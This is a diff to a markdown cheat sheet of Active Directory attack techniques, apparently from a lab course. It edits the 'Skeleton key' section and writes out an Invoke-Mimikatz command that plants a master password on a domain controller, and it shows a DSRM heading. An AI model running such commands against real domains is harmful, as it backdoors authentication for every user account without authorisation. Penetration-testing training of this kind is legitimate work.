@@ -568,11 +568,11 @@ Get-wmiobject -Class win32_operatingsystem -ComputerName dcorp-dc.dollarcorp.mon
 
 ## Skeleton key
 Access any machine with the password mimikatz
-Leaves a big gap in their security!
+Leaves a big gap in their security because you can login on any user with the password "mimikatz"
 
 #### Create the skeleton key - Requires DA admin
 ```
-Invoke-MimiKatz -Command ‘”privilege::debug” “misc::skeleton”’ -Computername dcorp-dc.dollarcorp.moneycorp.local
+Invoke-MimiKatz -Command '"privilege::debug" "misc::skeleton"' -Computername dcorp-dc.dollarcorp.moneycorp.local
 ```
 
 ## DSRM
